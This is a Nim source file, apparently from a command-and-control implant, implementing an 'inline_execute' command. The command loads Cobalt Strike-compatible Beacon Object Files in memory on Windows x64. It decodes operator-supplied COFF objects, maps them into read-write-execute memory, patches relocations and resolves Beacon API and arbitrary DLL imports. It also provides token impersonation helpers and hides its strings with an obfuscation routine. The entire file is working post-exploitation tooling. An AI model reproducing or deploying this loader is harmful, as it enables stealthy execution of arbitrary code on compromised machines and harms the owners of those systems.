## inline_execute -- COFF/BOF loader for Windows x64.
## Compatible avec le format Cobalt Strike Beacon Object File.
## Beacon API: Output, Printf, DataParse/Extract/Int/Short/Length,
##   FormatAlloc/Free/Reset/Append/Printf/ToString/Int,
##   IsAdmin, UseToken, RevertToken, toWideChar.
## Imports externes: LIBNAME$FuncName.

import std/[json, strutils, base64]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  type
    HANDLE  = int
    DWORD   = uint32
    SIZE_T  = uint
    BOOL    = int32
    LPVOID  = pointer

  const
    MEM_COMMIT    = DWORD(0x1000)
    MEM_RESERVE   = DWORD(0x2000)
    MEM_RELEASE   = DWORD(0x8000)
    PAGE_RWX      = DWORD(0x40)
    TOKEN_QUERY   = DWORD(0x0008)

  proc VirtualAlloc(a: LPVOID, sz: SIZE_T, tp: DWORD, prot: DWORD): LPVOID
    {.importc: "VirtualAlloc", dynlib: "kernel32".}
  proc VirtualFree(a: LPVOID, sz: SIZE_T, tp: DWORD): BOOL
    {.importc: "VirtualFree", dynlib: "kernel32".}
  proc LoadLibraryA(n: cstring): HANDLE
    {.importc: "LoadLibraryA", dynlib: "kernel32".}
  proc GetProcAddress(h: HANDLE, n: cstring): LPVOID
    {.importc: "GetProcAddress", dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}
  proc GetCurrentProcess(): HANDLE
    {.importc: "GetCurrentProcess", dynlib: "kernel32".}
  proc MultiByteToWideChar(cp: DWORD, flags: DWORD, src: cstring,
                            sl: cint, dst: ptr uint16, dl: cint): cint
    {.importc: "MultiByteToWideChar", dynlib: "kernel32".}
  proc OpenProcessToken(ph: HANDLE, da: DWORD, th: ptr HANDLE): BOOL
    {.importc: "OpenProcessToken", dynlib: "advapi32".}
  proc GetTokenInformation(th: HANDLE, tic: int32, ti: pointer,
                            til: DWORD, rl: ptr DWORD): BOOL
    {.importc: "GetTokenInformation", dynlib: "advapi32".}
  proc ImpersonateLoggedOnUser(h: HANDLE): BOOL
    {.importc: "ImpersonateLoggedOnUser", dynlib: "advapi32".}
  proc RevertToSelf(): BOOL
    {.importc: "RevertToSelf", dynlib: "advapi32".}

  # ── Beacon API C implementations (varargs require C emit) ────────────────
  {.emit: """
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>

static void (*g_bof_cb)(const char* d, int l) = NULL;
void nim_set_bof_cb(void* fn) { g_bof_cb = (void(*)(const char*,int))fn; }

void CS_BeaconOutput(int t, const char* d, int l) {
    if (l > 0 && g_bof_cb) g_bof_cb(d, l); }
void CS_BeaconPrintf(int t, const char* fmt, ...) {
    char buf[65536]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf)-1, fmt, ap); va_end(ap);
    if (n > 0 && g_bof_cb) g_bof_cb(buf, n); }

typedef struct { char* orig; char* buf; int len; int sz; } CS_datap;
void CS_BeaconDataParse(CS_datap* p, char* b, int l)
    { p->orig=p->buf=b; p->len=p->sz=l; }
int CS_BeaconDataInt(CS_datap* p) {
    if (p->len<4) return 0; int v; memcpy(&v,p->buf,4);
    p->buf+=4; p->len-=4; return v; }
short CS_BeaconDataShort(CS_datap* p) {
    if (p->len<2) return 0; short v; memcpy(&v,p->buf,2);
    p->buf+=2; p->len-=2; return v; }
int CS_BeaconDataLength(CS_datap* p) { return p->len; }
char* CS_BeaconDataExtract(CS_datap* p, int* sz) {
    if (p->len<4) return NULL; int l=CS_BeaconDataInt(p);
    if (p->len<l) return NULL; char* r=p->buf;
    p->buf+=l; p->len-=l; if(sz)*sz=l; return r; }

typedef struct { char* orig; char* buf; int len; int sz; } CS_formatp;
void CS_BeaconFormatAlloc(CS_formatp* f, int m)
    { f->orig=f->buf=(char*)malloc(m); f->len=m; f->sz=0; }
void CS_BeaconFormatReset(CS_formatp* f) { f->buf=f->orig; f->sz=0; }
void CS_BeaconFormatFree(CS_formatp* f) {
    if(f->orig){free(f->orig);f->orig=f->buf=NULL;} f->len=f->sz=0; }
void CS_BeaconFormatAppend(CS_formatp* f, char* d, int l) {
    if(!f->orig||f->sz+l>f->len) return;
    memcpy(f->orig+f->sz, d, l); f->sz+=l; }
void CS_BeaconFormatPrintf(CS_formatp* f, const char* fmt, ...) {
    if(!f->orig) return; int av=f->len-f->sz; if(av<=0) return;
    va_list ap; va_start(ap,fmt);
    int n=vsnprintf(f->orig+f->sz,(size_t)av,fmt,ap); va_end(ap);
    if(n>0) f->sz+=(n<av?n:av); }
char* CS_BeaconFormatToString(CS_formatp* f, int* sz)
    { if(sz)*sz=f->sz; return f->orig; }
void CS_BeaconFormatInt(CS_formatp* f, int v) {
    char b[4]; b[0]=(char)((v>>24)&0xFF); b[1]=(char)((v>>16)&0xFF);
    b[2]=(char)((v>>8)&0xFF); b[3]=(char)(v&0xFF);
    CS_BeaconFormatAppend(f,b,4); }
""".}

  proc nimSetBofCb(fn: pointer) {.importc: "nim_set_bof_cb", cdecl, nodecl.}
  proc CS_BeaconOutput(t: cint, d: cstring, l: cint) {.importc, cdecl, nodecl.}
  proc CS_BeaconPrintf(t: cint, fmt: cstring) {.importc, cdecl, varargs, nodecl.}
  proc CS_BeaconDataParse(p: pointer, b: cstring, l: cint) {.importc, cdecl, nodecl.}
  proc CS_BeaconDataInt(p: pointer): cint {.importc, cdecl, nodecl.}
  proc CS_BeaconDataShort(p: pointer): cshort {.importc, cdecl, nodecl.}
  proc CS_BeaconDataLength(p: pointer): cint {.importc, cdecl, nodecl.}
  proc CS_BeaconDataExtract(p: pointer, sz: ptr cint): cstring {.importc, cdecl, nodecl.}
  proc CS_BeaconFormatAlloc(f: pointer, m: cint) {.importc, cdecl, nodecl.}
  proc CS_BeaconFormatReset(f: pointer) {.importc, cdecl, nodecl.}
  proc CS_BeaconFormatFree(f: pointer) {.importc, cdecl, nodecl.}
  proc CS_BeaconFormatAppend(f: pointer, d: cstring, l: cint) {.importc, cdecl, nodecl.}
  proc CS_BeaconFormatPrintf(f: pointer, fmt: cstring) {.importc, cdecl, varargs, nodecl.}
  proc CS_BeaconFormatToString(f: pointer, sz: ptr cint): cstring {.importc, cdecl, nodecl.}
  proc CS_BeaconFormatInt(f: pointer, v: cint) {.importc, cdecl, nodecl.}

  # ── WinAPI Beacon helpers ─────────────────────────────────────────────────
  proc bofIsAdmin(): cint {.cdecl.} =
    var hTok: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hTok) == 0: return 0
    defer: discard CloseHandle(hTok)
    var elev: uint32 = 0
    var needed: DWORD = 0
    if GetTokenInformation(hTok, 20.int32, addr elev, 4, addr needed) != 0:
      return if elev != 0: 1.cint else: 0.cint
    return 0

  proc bofUseToken(h: HANDLE): cint {.cdecl.} =
    if ImpersonateLoggedOnUser(h) != 0: 1 else: 0

  proc bofRevertToken() {.cdecl.} =
    discard RevertToSelf()

  proc bofToWideChar(src: cstring, dst: ptr uint16, mc: cint) {.cdecl.} =
    discard MultiByteToWideChar(65001.DWORD, 0, src, -1.cint, dst, mc)

  # ── Output accumulator ────────────────────────────────────────────────────
  var gBofOut {.global.}: string = ""

  proc bofAppend(d: cstring, l: cint) {.cdecl.} =
    if l > 0:
      let s = newString(int(l))
      copyMem(unsafeAddr s[0], d, int(l))
      gBofOut.add(s)

  # ── Beacon function pointer table (slot = addr given to __imp_ symbols) ───
  const MAX_BCN = 24
  var bcnSlots {.global.}: array[MAX_BCN, pointer]
  var bcnNames {.global.}: array[MAX_BCN, string]
  var bcnN     {.global.}: int = 0

  const MAX_EXT = 512
  var extSlots {.global.}: array[MAX_EXT, pointer]
  var extKeys  {.global.}: array[MAX_EXT, string]
  var extN     {.global.}: int = 0

  proc initBcnTable() =
    bcnN = 0
    template put(nm: string, fn: pointer) =
      bcnSlots[bcnN] = fn; bcnNames[bcnN] = nm; inc bcnN
    put(hidstr("BeaconOutput"),         cast[pointer](CS_BeaconOutput))
    put(hidstr("BeaconPrintf"),         cast[pointer](CS_BeaconPrintf))
    put(hidstr("BeaconDataParse"),      cast[pointer](CS_BeaconDataParse))
    put(hidstr("BeaconDataInt"),        cast[pointer](CS_BeaconDataInt))
    put(hidstr("BeaconDataShort"),      cast[pointer](CS_BeaconDataShort))
    put(hidstr("BeaconDataLength"),     cast[pointer](CS_BeaconDataLength))
    put(hidstr("BeaconDataExtract"),    cast[pointer](CS_BeaconDataExtract))
    put(hidstr("BeaconFormatAlloc"),    cast[pointer](CS_BeaconFormatAlloc))
    put(hidstr("BeaconFormatReset"),    cast[pointer](CS_BeaconFormatReset))
    put(hidstr("BeaconFormatFree"),     cast[pointer](CS_BeaconFormatFree))
    put(hidstr("BeaconFormatAppend"),   cast[pointer](CS_BeaconFormatAppend))
    put(hidstr("BeaconFormatPrintf"),   cast[pointer](CS_BeaconFormatPrintf))
    put(hidstr("BeaconFormatToString"), cast[pointer](CS_BeaconFormatToString))
    put(hidstr("BeaconFormatInt"),      cast[pointer](CS_BeaconFormatInt))
    put(hidstr("BeaconIsAdmin"),        cast[pointer](bofIsAdmin))
    put(hidstr("BeaconUseToken"),       cast[pointer](bofUseToken))
    put(hidstr("BeaconRevertToken"),    cast[pointer](bofRevertToken))
    put(hidstr("toWideChar"),           cast[pointer](bofToWideChar))
    let k32 = LoadLibraryA("kernel32.dll")
    put(hidstr("LoadLibraryA"),         GetProcAddress(k32, "LoadLibraryA"))
    put(hidstr("GetProcAddress"),       GetProcAddress(k32, "GetProcAddress"))
    put(hidstr("FreeLibrary"),          GetProcAddress(k32, "FreeLibrary"))

  proc resolveBcn(name: string): pointer =
    for i in 0..<bcnN:
      if bcnNames[i] == name: return addr bcnSlots[i]
    return nil

  proc resolveExt(key: string): pointer =
    for i in 0..<extN:
      if extKeys[i] == key: return addr extSlots[i]
    let dol    = key.find('$')
    var lib    = if dol >= 0: key[0..<dol].toLower else: "kernel32"
    let fn     = if dol >= 0: key[dol+1..^1] else: key
    if not lib.endsWith(".dll"): lib.add(".dll")
    let hLib   = LoadLibraryA(lib.cstring)
    if hLib == 0: return nil
    let fnAddr = GetProcAddress(hLib, fn.cstring)
    if fnAddr == nil: return nil
    if extN < MAX_EXT:
      extSlots[extN] = fnAddr
      extKeys[extN]  = key
      let idx = extN
      inc extN
      return addr extSlots[idx]
    return nil

  # ── COFF parsing ──────────────────────────────────────────────────────────
  const
    MACHINE_AMD64      = uint16(0x8664)
    REL_ADDR64         = uint16(0x0001)
    REL_ADDR32         = uint16(0x0002)
    REL_ADDR32NB       = uint16(0x0003)
    REL_REL32          = uint16(0x0004)
    REL_REL32_1        = uint16(0x0005)
    REL_REL32_2        = uint16(0x0006)
    REL_REL32_3        = uint16(0x0007)
    REL_REL32_4        = uint16(0x0008)
    REL_REL32_5        = uint16(0x0009)

  proc ru16(d: seq[byte], o: int): uint16 =
    uint16(d[o]) or (uint16(d[o+1]) shl 8)
  proc ru32(d: seq[byte], o: int): uint32 =
    uint32(d[o]) or (uint32(d[o+1]) shl 8) or
    (uint32(d[o+2]) shl 16) or (uint32(d[o+3]) shl 24)
  proc ri16(d: seq[byte], o: int): int16 = cast[int16](ru16(d, o))

  proc symName(nameBytes: array[8, byte], strTbl: seq[byte]): string =
    if nameBytes[0] == 0 and nameBytes[1] == 0 and
       nameBytes[2] == 0 and nameBytes[3] == 0:
      let off = int(uint32(nameBytes[4]) or (uint32(nameBytes[5]) shl 8) or
                    (uint32(nameBytes[6]) shl 16) or (uint32(nameBytes[7]) shl 24))
      var i = off
      while i < strTbl.len and strTbl[i] != 0:
        result.add(char(strTbl[i])); inc i
    else:
      var i = 0
      while i < 8 and nameBytes[i] != 0:
        result.add(char(nameBytes[i])); inc i

  proc runBof(bof: seq[byte], args: seq[byte], entry: string): string =
    if bof.len < 20: return hidstr("Error: COFF too small")
    if ru16(bof, 0) != MACHINE_AMD64: return hidstr("Error: not x64 COFF")

    let nSec   = int(ru16(bof, 2))
    let symOff = int(ru32(bof, 8))
    let nSym   = int(ru32(bof, 12))
    let optSz  = int(ru16(bof, 16))
    let secOff = 20 + optSz

    # String table
    let strOff = symOff + nSym * 18
    var strTbl: seq[byte] = @[]
    if strOff + 4 <= bof.len:
      let strSz = int(ru32(bof, strOff))
      if strOff + strSz <= bof.len:
        strTbl = bof[strOff ..< strOff + strSz]

    # Sections
    type SecInfo = object
      ptrRaw, szRaw, ptrReloc, nReloc: int
      chars: uint32
    var secs = newSeq[SecInfo](nSec)
    var secMem = newSeq[pointer](nSec)

    for i in 0..<nSec:
      let o = secOff + i * 40
      secs[i].ptrRaw   = int(ru32(bof, o + 20))
      secs[i].szRaw    = int(ru32(bof, o + 16))
      secs[i].ptrReloc = int(ru32(bof, o + 24))
      secs[i].nReloc   = int(ru16(bof, o + 32))
      secs[i].chars    = ru32(bof, o + 36)
      let sz = max(secs[i].szRaw, 16)
      let mem = VirtualAlloc(nil, SIZE_T(sz), MEM_COMMIT or MEM_RESERVE, PAGE_RWX)
      if mem == nil:
        for j in 0..<i: discard VirtualFree(secMem[j], 0, MEM_RELEASE)
        return hidstr("Error: VirtualAlloc failed")
      secMem[i] = mem
      if secs[i].szRaw > 0 and secs[i].ptrRaw + secs[i].szRaw <= bof.len:
        copyMem(mem, unsafeAddr bof[secs[i].ptrRaw], secs[i].szRaw)

    # Symbols
    type SymEntry = object
      nameBytes: array[8, byte]
      value: uint32
      secNum: int16
      auxN: int
    var syms = newSeq[SymEntry](nSym)
    var si = 0
    while si < nSym:
      let o = symOff + si * 18
      if o + 18 > bof.len: break
      for j in 0..<8: syms[si].nameBytes[j] = bof[o + j]
      syms[si].value  = ru32(bof, o + 8)
      syms[si].secNum = ri16(bof, o + 12)
      syms[si].auxN   = int(bof[o + 17])
      si += 1 + syms[si].auxN

    proc getSymAddr(idx: int): pointer =
      if idx >= nSym: return nil
      let s = syms[idx]
      let sn = int(s.secNum)
      if sn > 0 and sn <= nSec:
        return cast[pointer](cast[int](secMem[sn-1]) + int(s.value))
      let name = symName(s.nameBytes, strTbl)
      let lookup = if name.startsWith("__imp_"): name[6..^1] else: name
      let b = resolveBcn(lookup)
      if b != nil: return b
      return resolveExt(lookup)

    # Relocations
    for si2 in 0..<nSec:
      for ri in 0..<secs[si2].nReloc:
        let ro = secs[si2].ptrReloc + ri * 10
        if ro + 10 > bof.len: break
        let virtAddr  = int(ru32(bof, ro))
        let symIdx    = int(ru32(bof, ro + 4))
        let relType   = ru16(bof, ro + 6)
        let patchAt   = cast[int](secMem[si2]) + virtAddr
        let sa        = getSymAddr(symIdx)
        if sa == nil: continue
        case relType
        of REL_ADDR64:
          let cur = cast[ptr int64](patchAt)[]
          cast[ptr int64](patchAt)[] = cast[int64](sa) + cur
        of REL_REL32, REL_REL32_1, REL_REL32_2, REL_REL32_3, REL_REL32_4, REL_REL32_5:
          let extra = int(relType) - int(REL_REL32)
          cast[ptr int32](patchAt)[] =
            int32(cast[int](sa) - (patchAt + 4 + extra))
        of REL_ADDR32, REL_ADDR32NB:
          cast[ptr uint32](patchAt)[] = uint32(cast[int](sa) and 0xFFFFFFFF'i64)
        else: discard

    # Find entry point
    var entryAddr: pointer = nil
    for i in 0..<nSym:
      let name = symName(syms[i].nameBytes, strTbl)
      if name == entry:
        let sn = int(syms[i].secNum)
        if sn > 0 and sn <= nSec:
          entryAddr = cast[pointer](cast[int](secMem[sn-1]) + int(syms[i].value))
        break

    if entryAddr == nil:
      for i in 0..<nSec: discard VirtualFree(secMem[i], 0, MEM_RELEASE)
      return hidstr("Error: entry '") & entry & hidstr("' not found")

    type GoBof = proc(args: pointer, alen: cint) {.cdecl.}
    let goFn = cast[GoBof](entryAddr)

    gBofOut = ""
    nimSetBofCb(cast[pointer](bofAppend))

    if args.len > 0:
      goFn(unsafeAddr args[0], cint(args.len))
    else:
      var dummy: byte = 0
      goFn(addr dummy, 0)

    result = gBofOut

    for i in 0..<nSec: discard VirtualFree(secMem[i], 0, MEM_RELEASE)

proc inlineExecuteExecute(taskId: string, params: JsonNode,
                           state: AgentState, send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("inline_execute: Windows only"),
                      status: "error", completed: true)
  else:
    let bofB64  = params{"bof_b64"}.getStr("")
    let argsB64 = params{"args_b64"}.getStr("")
    let entry   = params{"entry_point"}.getStr("go")

    if bofB64.len == 0:
      return TaskResult(output: hidstr("Error: bof_b64 missing"),
                        status: "error", completed: true)

    let bof  = cast[seq[byte]](decode(bofB64))
    let args = if argsB64.len > 0: cast[seq[byte]](decode(argsB64)) else: @[]

    initBcnTable()
    let output = runBof(bof, args, entry)

    let stat = if output.startsWith("Error"): "error" else: "success"
    return TaskResult(output: output, status: stat, completed: true)

proc initInlineExecute*() =
  register(hidstr("inline_execute"), inlineExecuteExecute)
